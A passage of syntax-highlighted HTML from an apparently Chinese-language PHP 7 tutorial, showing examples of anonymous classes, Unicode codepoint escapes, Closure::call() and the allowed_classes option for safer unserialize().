style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">{</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n    </span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">public</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">function</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> log</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">(</span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">string</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> $msg</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">);</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">}</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n\n</span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">class</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"typ\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,0,102);\">Application</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">{</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n    </span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">private</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> $logger</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">;</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n\n    </span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">public</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">function</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> getLogger</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">():</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"typ\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,0,102);\">Logger</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">{</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n         </span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">return</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> $this</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">-&gt;</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">logger</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">;</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n    </span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">}</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n\n    </span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">public</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">function</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> setLogger</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">(</span><span class=\"typ\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,0,102);\">Logger</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> $logger</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">)</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">{</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n         $this</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">-&gt;</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">logger </span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">=</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> $logger</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">;</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n    </span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">}</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">}</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n\n$app </span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">=</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">new</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"typ\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,0,102);\">Application</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">;</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n$app</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">-&gt;</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">setLogger</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">(</span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">new</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">class</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">implements</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"typ\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,0,102);\">Logger</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">{</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n    </span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">public</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">function</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> log</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">(</span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">string</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> $msg</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">)</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">{</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n        echo $msg</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">;</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n    </span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">}</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">});</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n\nvar_dump</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">(</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">$app</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">-&gt;</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">getLogger</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">());</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">?&gt;</span></span></pre><p style=\"border:0px;margin-bottom:0px;line-height:2em;color:rgb(51,51,51);background-color:rgb(255,255,255);font-family:'Helvetica Neue', Helvetica, 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', 'Noto Sans CJK SC', 'WenQuanYi Micro Hei', Arial, sans-serif;\"><span style=\"font-size:16px;\">以上实例会输出：</span></p><pre class=\"prettyprint prettyprinted\" style=\"border-width:1px 1px 1px 4px;border-style:solid;border-color:rgb(221,221,221);margin:15px auto;padding:10px 15px;white-space:pre-wrap;background:rgb(251,251,251) url(&quot;/images/codecolorer_bg.gif&quot;) center top;color:rgb(51,51,51);font-family:Menlo, Monaco, Consolas, 'Andale Mono', 'lucida console', 'Courier New', monospace;\"><span style=\"font-size:16px;\"><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">object</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">(</span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">class</span><span class=\"lit\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,102,102);\">@anonymous</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">)#</span><span class=\"lit\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,102,102);\">2</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">(</span><span class=\"lit\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,102,102);\">0</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">)</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">{</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">}</span></span></pre><hr style=\"background-color:rgb(212,212,212);color:rgb(212,212,212);height:1px;border-width:0px;clear:both;font-family:'Helvetica Neue', Helvetica, 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', 'Noto Sans CJK SC', 'WenQuanYi Micro Hei', Arial, sans-serif;\"><h2 style=\"border:0px;margin-top:2px;margin-bottom:2px;padding:0px;line-height:1.8em;color:rgb(51,51,51);background-color:rgb(255,255,255);font-family:'Helvetica Neue', Helvetica, 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', 'Noto Sans CJK SC', 'WenQuanYi Micro Hei', Arial, sans-serif;\"><span style=\"font-size:16px;\">Unicode codepoint 转译语法</span></h2><p style=\"border:0px;margin-bottom:0px;line-height:2em;color:rgb(51,51,51);background-color:rgb(255,255,255);font-family:'Helvetica Neue', Helvetica, 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', 'Noto Sans CJK SC', 'WenQuanYi Micro Hei', Arial, sans-serif;\"><span style=\"font-size:16px;\">这接受一个以16进制形式的 Unicode codepoint，并打印出一个双引号或heredoc包围的 UTF-8 编码格式的字符串。 可以接受任何有效的 codepoint，并且开头的 0 是可以省略的。</span></p><pre class=\"prettyprint prettyprinted\" style=\"border-width:1px 1px 1px 4px;border-style:solid;border-color:rgb(221,221,221);margin:15px auto;padding:10px 15px;white-space:pre-wrap;background:rgb(251,251,251) url(&quot;/images/codecolorer_bg.gif&quot;) center top;color:rgb(51,51,51);font-family:Menlo, Monaco, Consolas, 'Andale Mono', 'lucida console', 'Courier New', monospace;\"><span style=\"font-size:16px;\"><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">echo </span><span class=\"str\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,136,0);\">\"\\u{aa}\"</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">;</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\necho </span><span class=\"str\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,136,0);\">\"\\u{0000aa}\"</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">;</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\necho </span><span class=\"str\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,136,0);\">\"\\u{9999}\"</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">;</span></span></pre><p style=\"border:0px;margin-bottom:0px;line-height:2em;color:rgb(51,51,51);background-color:rgb(255,255,255);font-family:'Helvetica Neue', Helvetica, 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', 'Noto Sans CJK SC', 'WenQuanYi Micro Hei', Arial, sans-serif;\"><span style=\"font-size:16px;\">以上实例会输出：</span></p><pre class=\"prettyprint prettyprinted\" style=\"border-width:1px 1px 1px 4px;border-style:solid;border-color:rgb(221,221,221);margin:15px auto;padding:10px 15px;white-space:pre-wrap;background:rgb(251,251,251) url(&quot;/images/codecolorer_bg.gif&quot;) center top;color:rgb(51,51,51);font-family:Menlo, Monaco, Consolas, 'Andale Mono', 'lucida console', 'Courier New', monospace;\"><span style=\"font-size:16px;\"><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">ª</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">ª</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">(</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">same </span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">as</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> before but </span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">with</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> optional leading </span><span class=\"lit\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,102,102);\">0</span><span class=\"str\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,136,0);\">'s)\n香</span></span></pre><hr style=\"background-color:rgb(212,212,212);color:rgb(212,212,212);height:1px;border-width:0px;clear:both;font-family:'Helvetica Neue', Helvetica, 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', 'Noto Sans CJK SC', 'WenQuanYi Micro Hei', Arial, sans-serif;\"><h2 style=\"border:0px;margin-top:2px;margin-bottom:2px;padding:0px;line-height:1.8em;color:rgb(51,51,51);background-color:rgb(255,255,255);font-family:'Helvetica Neue', Helvetica, 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', 'Noto Sans CJK SC', 'WenQuanYi Micro Hei', Arial, sans-serif;\"><span style=\"font-size:16px;\">Closure::call()</span></h2><p style=\"border:0px;margin-bottom:0px;line-height:2em;color:rgb(51,51,51);background-color:rgb(255,255,255);font-family:'Helvetica Neue', Helvetica, 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', 'Noto Sans CJK SC', 'WenQuanYi Micro Hei', Arial, sans-serif;\"><span style=\"font-size:16px;\">Closure::call() 现在有着更好的性能，简短干练的暂时绑定一个方法到对象上闭包并调用它。</span></p><pre class=\"prettyprint prettyprinted\" style=\"border-width:1px 1px 1px 4px;border-style:solid;border-color:rgb(221,221,221);margin:15px auto;padding:10px 15px;white-space:pre-wrap;background:rgb(251,251,251) url(&quot;/images/codecolorer_bg.gif&quot;) center top;color:rgb(51,51,51);font-family:Menlo, Monaco, Consolas, 'Andale Mono', 'lucida console', 'Courier New', monospace;\"><span style=\"font-size:16px;\"><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">&lt;?</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">php\n</span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">class</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> A </span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">{</span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">private</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> $x </span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">=</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"lit\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,102,102);\">1</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">;}</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n\n</span><span class=\"com\" style=\"border:0px;margin:0px;padding:0px;color:rgb(136,0,0);\">// Pre PHP 7 代码</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n$getXCB </span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">=</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">function</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">()</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">{</span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">return</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> $this</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">-&gt;</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">x</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">;};</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n$getX </span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">=</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> $getXCB</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">-&gt;</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">bindTo</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">(</span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">new</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> A</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">,</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"str\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,136,0);\">'A'</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">);</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"com\" style=\"border:0px;margin:0px;padding:0px;color:rgb(136,0,0);\">// intermediate closure</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\necho $getX</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">();</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n\n</span><span class=\"com\" style=\"border:0px;margin:0px;padding:0px;color:rgb(136,0,0);\">// PHP 7+ 代码</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n$getX </span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">=</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">function</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">()</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">{</span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">return</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> $this</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">-&gt;</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">x</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">;};</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\necho $getX</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">-&gt;</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">call</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">(</span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">new</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> A</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">);</span></span></pre><p style=\"border:0px;margin-bottom:0px;line-height:2em;color:rgb(51,51,51);background-color:rgb(255,255,255);font-family:'Helvetica Neue', Helvetica, 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', 'Noto Sans CJK SC', 'WenQuanYi Micro Hei', Arial, sans-serif;\"><span style=\"font-size:16px;\">以上实例会输出：</span></p><pre class=\"prettyprint prettyprinted\" style=\"border-width:1px 1px 1px 4px;border-style:solid;border-color:rgb(221,221,221);margin:15px auto;padding:10px 15px;white-space:pre-wrap;background:rgb(251,251,251) url(&quot;/images/codecolorer_bg.gif&quot;) center top;color:rgb(51,51,51);font-family:Menlo, Monaco, Consolas, 'Andale Mono', 'lucida console', 'Courier New', monospace;\"><span style=\"font-size:16px;\"><span class=\"lit\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,102,102);\">1</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n</span><span class=\"lit\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,102,102);\">1</span></span></pre><hr style=\"background-color:rgb(212,212,212);color:rgb(212,212,212);height:1px;border-width:0px;clear:both;font-family:'Helvetica Neue', Helvetica, 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', 'Noto Sans CJK SC', 'WenQuanYi Micro Hei', Arial, sans-serif;\"><h2 style=\"border:0px;margin-top:2px;margin-bottom:2px;padding:0px;line-height:1.8em;color:rgb(51,51,51);background-color:rgb(255,255,255);font-family:'Helvetica Neue', Helvetica, 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', 'Noto Sans CJK SC', 'WenQuanYi Micro Hei', Arial, sans-serif;\"><span style=\"font-size:16px;\">为unserialize()提供过滤</span></h2><p style=\"border:0px;margin-bottom:0px;line-height:2em;color:rgb(51,51,51);background-color:rgb(255,255,255);font-family:'Helvetica Neue', Helvetica, 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', 'Noto Sans CJK SC', 'WenQuanYi Micro Hei', Arial, sans-serif;\"><span style=\"font-size:16px;\">这个特性旨在提供更安全的方式解包不可靠的数据。它通过白名单的方式来防止潜在的代码注入。</span></p><pre class=\"prettyprint prettyprinted\" style=\"border-width:1px 1px 1px 4px;border-style:solid;border-color:rgb(221,221,221);margin:15px auto;padding:10px 15px;white-space:pre-wrap;background:rgb(251,251,251) url(&quot;/images/codecolorer_bg.gif&quot;) center top;color:rgb(51,51,51);font-family:Menlo, Monaco, Consolas, 'Andale Mono', 'lucida console', 'Courier New', monospace;\"><span style=\"font-size:16px;\"><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">&lt;?</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">php\n\n</span><span class=\"com\" style=\"border:0px;margin:0px;padding:0px;color:rgb(136,0,0);\">// 转换对象为 __PHP_Incomplete_Class 对象</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n$data </span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">=</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> unserialize</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">(</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">$foo</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">,</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">[</span><span class=\"str\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,136,0);\">\"allowed_classes\"</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">=&gt;</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">false</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">]);</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n\n</span><span class=\"com\" style=\"border:0px;margin:0px;padding:0px;color:rgb(136,0,0);\">// 转换对象为 __PHP_Incomplete_Class 对象，除了 MyClass 和 MyClass2</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n$data </span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">=</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> unserialize</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">(</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">$foo</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">,</span><span class=\"pln\" 